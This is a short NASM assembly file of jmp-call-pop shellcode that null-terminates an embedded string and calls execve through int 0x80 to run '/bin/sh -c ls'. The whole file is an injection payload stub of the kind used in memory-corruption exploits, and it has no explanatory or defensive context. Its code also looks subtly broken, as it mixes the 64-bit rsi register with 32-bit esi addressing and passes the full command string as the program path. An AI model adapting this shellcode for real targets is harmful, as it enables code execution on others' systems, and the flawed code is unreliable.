Section .text

	global _start

 _start:
	jmp short GotoCall

 shellcode: 
	pop rsi 
	xor eax, eax
	mov byte [esi+13], al
	lea ebx, [esi]
	mov [esi + 14], ebx
	mov [esi + 18], eax
	mov byte al, 0x0b
	mov ebx, esi 
	lea ecx, [esi + 14]
	lea edx, [esi + 18] 
	int 0x80 

GotoCall:
	Call shellcode
	db '/bin/sh -c lsJAAAAKKKK'
